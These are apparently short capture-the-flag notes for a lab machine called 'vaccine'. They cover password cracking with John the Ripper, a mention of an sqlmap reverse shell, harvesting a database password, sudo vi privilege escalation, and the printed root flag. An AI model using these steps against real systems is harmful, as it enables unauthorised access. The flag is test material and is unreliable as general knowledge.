ip = 10.129.228.235

```bash
zip2john protected.zip > hash.txt

# find hash code in hash.txt

john --list=formats | grep pkzip

john --format=pkzip hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

password for zip = 741852963 (backup.zip)

```bash
john search?
john --format=md5-raw hash.txt --wordlist=/...
```

password for web page = qwerty789

---

use sqlmap to reverse shell into the server

user.txt found in lib. Extract with

```bash
find / -name 'user.txt' 2>/dev/null | xargs cat
```

copy /var/www/html/dashboard.php contents using base64. Found this line

```php
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

use sudo -l to list permission

```bash
postgres@vaccine:~$ sudo -l
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
THS LINE -->    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

then run command

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

root flag:
dd6e058e814260bc70e9bbdef2715849
